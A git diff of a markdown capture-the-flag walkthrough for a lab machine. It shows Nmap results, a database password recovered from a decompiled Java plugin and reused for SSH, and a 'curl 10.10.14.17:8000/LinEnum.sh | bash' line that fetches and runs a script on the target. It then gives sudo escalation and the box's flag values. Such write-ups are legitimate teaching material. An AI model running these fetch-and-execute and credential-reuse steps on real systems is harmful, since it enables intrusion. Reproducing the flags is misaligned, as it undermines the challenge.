@@ -7,8 +7,12 @@
     - [Ports](#ports)
   - [Gobuster](#gobuster)
     - [Directories](#directories)
+- [Recon](#recon)
+    - [Java Files](#java-files)
+    - [phpMyAdmin](#phpmyadmin)
+- [Privilege Escalation](#privilege-escalation)
 - [Expolit](#expolit)
-- [Post Exploit](#post-exploit)
+    - [Sudo Exploit](#sudo-exploit)
 - [Flags](#flags)
     - [User Flag](#user-flag)
     - [Root Flag](#root-flag)
@@ -16,10 +20,33 @@
 # Scan Results
 
 ## Nmap
+```
+# Nmap 7.80 scan initiated Sun Mar  1 15:14:00 2020 as: nmap -sC -sV -oA ./Scans/nmap 10.10.10.37
+Nmap scan report for 10.10.10.37
+Host is up (0.085s latency).
+Not shown: 996 filtered ports
+PORT     STATE  SERVICE VERSION
+21/tcp   open   ftp     ProFTPD 1.3.5a
+22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: BlockyCraft &#8211; Under Construction!
+8192/tcp closed sophos
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Mar  1 15:14:18 2020 -- 1 IP address (1 host up) scanned in 18.22 seconds
+
+```
 ### Ports
-* Port 80 - HTTP
-* Port 22 - SSH
+* 21 - FTP
+* 22 - SSH
+* 80 - HTTP
   
 ## Gobuster
 install gobuster if you dont have it
@@ -66,14 +93,23 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 * /javascript 
 * /phpmyadmin
 
+# Recon
+
+### Java Files
+
 Download files from /plugins folder and extract BlockyCore.jar using
 
 ```
 jar xf ./BlockyCore.jar
 ```
 
-Inside the "com" folder find BlockyCore.class file. this is a java class file.
-using a java [decompiler](http://www.javadecompilers.com/) we get the following code:
+Inside the "com" folder find BlockyCore.class file. This is a java class file, to see the code we need to decompile it. We can use an online [decompiler](http://www.javadecompilers.com/) or jd-gui. If you dont have _**jd-gui**_:
+
+```
+apt install jd-gui
+```
+
+Finally we get the following code:
 
 ```java
 // 
@@ -116,10 +152,15 @@ PhpMyAdmin:
 Username: root  
 Password: 8YsqfCTnvxAUeduzjNSXe22
 ```
+
+### phpMyAdmin
+
 Go to the phpmyadmin page, and login as root. Click on Databses at the top left  
+
 ![phoMyAdmin Header](./Pictures/phpmyadmin.png)
 
 we can see a wordpress database:  
+
 ![Databases](./Pictures/databses.png)  
 
 which includes wp_users table. Inside we can see the username and password for the wordpress website
@@ -137,29 +178,56 @@ The password is hashed so we cant use it like this. One option is to change it b
 
 SSH into the box as _**notch**_ and use the password for the mysql database _**8YsqfCTnvxAUeduzjNSXe22**_.  
 
-We get a shell notch:
+We get shell as notch:
 
 ![Login](./Pictures/notch_login.png)
 
-Listing the files, we see a _**user.txt**_ file which hold the user flag.
+Listing the files, we see a _**user.txt**_ file which holds the user flag.
 
-<!--The password field is hashed. In order to change it we edit the entry.
-change the user_pass column such that the _Function_ field is _MD5_ and the _Value_ is "password".  
 
-![WordPress User](./Pictures/pass_change.png)   
+# Privilege Escalation
+Now that we have a shell lets enumerate the box.  
 
-Scroll down and press _GO_   
-The new password is now "password" and we now we can login into wordpress as Notch-->
+Lets use **_LinEnum_** script. Change location to: _`opt/linux_privesc/LinEnum`_
+and start a python simple http server on this folder 
+
+```
+python -m SimpleHTTPServer
+```
+
+back on the box we need to connect to our ip `10.10.14.17:8000`, get the file and send it to bash:
+
+```
+curl 10.10.14.17:8000/LinEnum.sh | bash
+```
+
+The script doesnt show anything special but there is a section called 
+_**" [-] Accounts that have recentky used sudo: "**_
+and we can see that notch has ran a sudo command.
+
+which leads us to the next section.
 
 # Expolit
+### Sudo Exploit
+_LinEnum_ doesnt show this because it requires us to type the password
+Let see what sudo commands _notch_ can run:
 
-# Post Exploit
+```
+sudo -l
+```
+
+Insert the password for _notch_, and we can see that we can run everything! so we can just 
+```
+sudo su
+```
+to get root on the box. change to the root directory and `cat` the flag.
 
 # Flags
 
 ### User Flag
-at the root directory of user notch we find the _**user.txt**_  file
+at the root directory of user notch we find the _**user.txt**_ file
 which has the flag: _**59fee0977fb60b8a0bc6e41e751f3cd5**_
 
 ### Root Flag
-
+at the root directory of user root we find the _**root.txt**_ file
+which has the flag: _**0a9694a5b4d272c694679f7860f1cd5f**_
